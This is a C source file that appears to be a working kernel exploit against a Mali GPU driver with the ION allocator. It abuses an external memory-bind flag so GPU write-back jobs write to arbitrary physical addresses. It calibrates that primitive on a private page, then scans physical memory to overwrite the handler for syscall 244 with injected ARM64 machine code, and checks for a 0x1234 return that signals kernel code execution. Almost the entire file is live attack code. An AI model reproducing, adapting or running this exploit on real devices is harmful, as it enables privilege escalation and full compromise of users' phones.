#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ION_IOC_ALLOC 0xc0204900u
#define ION_IOC_SHARE 0xc0084904u
#define MALI_IOC_MEM_BIND 0xc0288302u
#define MALI_IOC_PP_START_JOB 0xc1988400u
#define MALI_IOC_WAIT_NOTIF 0xc0688202u
#define CMD_VA 0x20000000u
#define EXT_VA 0x40000000u
#define CALIB_VA 0x50000000u
#define ION_HEAP_SYSTEM 1u
#define ION_HEAP_CARVEOUT (1u << 2)
#define BIND_EXTERNAL (1u << 11)
#define PIXFMT_WB_128 0x06
#define PAGE_OFFSET 0xffffffc000000000ULL

struct ion_alloc { unsigned long len, align; uint32_t heap_mask, flags; void *handle; };
struct ion_fd { uint32_t handle; int32_t fd; };
struct mali_bind { uint64_t ctx; uint32_t vaddr, size, flags, padding; uint32_t phys_addr, rights, ext_flags, pad2; };

static void put32(void *b, unsigned off, uint32_t v){*(uint32_t*)((char*)b+off)=v;}
static void put64(void *b, unsigned off, uint64_t v){*(uint64_t*)((char*)b+off)=v;}
static int mali_fd=-1, ion_fd=-1;
static void *cmd_buf=NULL;

static void build_shader(void){
    uint32_t *c=(uint32_t*)cmd_buf;
    memset(cmd_buf,0,0x4000);
    c[0]=0; c[1]=0xB8000000u;
    c[2]=0xE0000002u|(((CMD_VA+0x3000u)>>3)&~0xE0000003u);
    c[3]=0xB0000000u; c[4]=0; c[5]=0xBC000000u; c[6]=0; c[7]=0;
}
static void encode_value(uint64_t val,uint32_t*c0,uint32_t*c1){
    unsigned char b[8]; memcpy(b,&val,8);
    *c0=(uint32_t)b[4]|((uint32_t)b[5]<<8)|((uint32_t)b[2]<<16)|((uint32_t)b[3]<<24);
    *c1=(uint32_t)b[0]|((uint32_t)b[1]<<8)|((uint32_t)b[6]<<16)|((uint32_t)b[7]<<24);
}
static int bind_region(uint32_t vaddr,uint32_t size,uint32_t flags,uint32_t word0){
    struct mali_bind b; memset(&b,0,sizeof b);
    b.vaddr=vaddr; b.size=size; b.flags=flags; b.phys_addr=word0;
    return ioctl(mali_fd,MALI_IOC_MEM_BIND,&b);
}
static int gpu_submit(uint32_t dest,uint64_t val){
    uint32_t c0,c1; encode_value(val,&c0,&c1);
    static volatile uint32_t done; uint8_t job[408]; memset(job,0,sizeof job); done=0;
    put64(job,8,0x7777); put32(job,20,CMD_VA); put32(job,24,CMD_VA+0x1000);
    put32(job,32,0x02); put32(job,44,c0); put32(job,48,c1); put32(job,52,c0); put32(job,56,c1);
    put32(job,68,CMD_VA+0x2000); put32(job,72,(0x400u<<16)|0x400u);
    put32(job,84,1); put32(job,88,1); put32(job,92,0x77); put32(job,96,1);
    put32(job,104,0xE0C); put32(job,108,0x8888);
    put32(job,168,0x02); put32(job,172,dest); put32(job,176,PIXFMT_WB_128);
    put32(job,188,0); put32(job,200,0); put32(job,328,1); put32(job,352,0);
    put32(job,396,(uint32_t)-1); put64(job,400,(uint64_t)(uintptr_t)&done);
    if(ioctl(mali_fd,MALI_IOC_PP_START_JOB,job)<0) return -1;
    uint8_t notif[104]; memset(notif,0,sizeof notif);
    alarm(5);
    int wr=ioctl(mali_fd,MALI_IOC_WAIT_NOTIF,notif);
    alarm(0);
    if(wr<0) return -1;
    usleep(100000);
    return 0;
}
/* Calibrate the write-back unit on a private ION carveout page. */
static int calibrate(void){
    struct ion_alloc a; memset(&a,0,sizeof a);
    a.len=0x1000; a.align=0x1000; a.heap_mask=ION_HEAP_CARVEOUT;
    if(ioctl(ion_fd,ION_IOC_ALLOC,&a)<0){perror("ion calib alloc");return -1;}
    struct ion_fd f; f.handle=(uint32_t)(uintptr_t)a.handle; f.fd=-1;
    if(ioctl(ion_fd,ION_IOC_SHARE,&f)<0){perror("ion calib share");return -1;}
    uint8_t*pg=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,f.fd,0);
    if(pg==MAP_FAILED){perror("mmap calib");return -1;}
    if(bind_region(CALIB_VA,0x1000,0x200,(uint32_t)f.fd)<0){perror("bind calib");return -1;}
    const uint32_t off=0x800; const uint64_t val=0xa1b2c3d4e5f60718ULL;
    memset(pg,0xa5,0x1000);
    if(gpu_submit(CALIB_VA+off,val)<0){printf("[!] calib write failed\n");return -1;}
    int ok=1;
    for(uint32_t i=0;i<0x1000;i++) if(pg[i]!=0xa5 && !(i>=off&&i<off+128)){ok=0;break;}
    printf("[*] calibration %s\n",ok?"OK":"FAILED");
    munmap(pg,0x1000);
    return ok?0:-1;
}
static int gpu_write128(uint32_t phys,uint64_t val){
    printf("[w] bind phys=0x%x\n",phys&~0xfffu);
    if(bind_region(EXT_VA,0x1000,BIND_EXTERNAL,phys&~0xfffu)<0){printf("[w] BIND FAIL\n");return -1;}
    printf("[w] submit dest=0x%x\n",EXT_VA+(phys&0xfffu));
    int r=gpu_submit(EXT_VA+(phys&0xfffu),val);
    printf("[w] submit ret=%d\n",r);
    return r;
}
static void cache_thrash(void){
    static volatile unsigned char *buf; const size_t len=8u<<20;
    if(!buf){ buf=mmap(NULL,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0); if(buf==MAP_FAILED){buf=NULL;return;} }
    for(size_t i=0;i<len;i+=64) buf[i]^=0x5a;
}

int main(int argc,char**argv){
    setvbuf(stdout,NULL,_IONBF,0);
    if(argc<4){ fprintf(stderr,"usage: %s <start_hex> <end_hex> <canary_phys_hex>\n",argv[0]); return 1; }
    uint32_t start=(uint32_t)strtoul(argv[1],NULL,16);
    uint32_t end=(uint32_t)strtoul(argv[2],NULL,16);
    uint32_t canphys=(uint32_t)strtoul(argv[3],NULL,16);
    uint64_t canvirt=PAGE_OFFSET|canphys;

    mali_fd=open("/dev/mali",O_RDWR); ion_fd=open("/dev/ion",O_RDWR);
    if(mali_fd<0||ion_fd<0){ perror("open mali/ion"); return 1; }
    struct ion_alloc a; memset(&a,0,sizeof a);
    a.len=0x4000; a.align=0x1000; a.heap_mask=ION_HEAP_SYSTEM;
    if(ioctl(ion_fd,ION_IOC_ALLOC,&a)<0){ perror("ion cmd alloc"); return 1; }
    struct ion_fd f; f.handle=(uint32_t)(uintptr_t)a.handle; f.fd=-1;
    if(ioctl(ion_fd,ION_IOC_SHARE,&f)<0){ perror("ion share"); return 1; }
    cmd_buf=mmap(NULL,0x4000,PROT_READ|PROT_WRITE,MAP_SHARED,f.fd,0);
    if(cmd_buf==MAP_FAILED){ perror("mmap cmd"); return 1; }
    if(bind_region(CMD_VA,0x4000,0x200,(uint32_t)f.fd)<0){ perror("bind cmd"); return 1; }
    build_shader();
    printf("[*] ready start=0x%x end=0x%x canary=0x%llx\n",start,end,(unsigned long long)canvirt);
    if(calibrate()<0){ printf("[!] abort: calibration failed\n"); return 2; }

    /* Machine-code canary written DIRECTLY into the slot:
     *   movz x0,#0x1234 ; ret  =  0xd65f03c0d2824680
     * gaw64 writes 128 bytes = 16 copies of this value, so syscall 244
     * executes these two instructions and returns 0x1234.
     * No kernel addresses to guess, no canary page needed. */
    uint64_t codecan = 0xd65f03c0d2824680ULL;

    uint32_t cur=start;
    long n=0;
    while(cur<end){
        uint32_t slot=cur+0x7a0;
        printf("[i] cur=0x%x\n",cur);
        if(gpu_write128(slot,codecan)<0){ printf("[!] write fail at 0x%x\n",slot); return 4; }
        cache_thrash();
        unsigned long r=(unsigned long)syscall(244,0UL,0UL,0UL);
        n++;
        /* Machine-code canary executes and returns 0x1234. */
        if(r==0x1234UL){
            printf("HIT table=0x%x slot=0x%x ret=0x1234\n",cur,slot);
            return 0;
        }
        if(r!=0xffffffffffffffffUL && (n%50)==0)
            printf("ODD 0x%x ret=0x%lx\n",cur,(unsigned long)r);
        if((n%50)==0) printf("... 0x%x n=%ld\n",cur,n);
        cur+=0x1000;
    }
    printf("DONE no hit n=%ld\n",n);
    return 2;
}
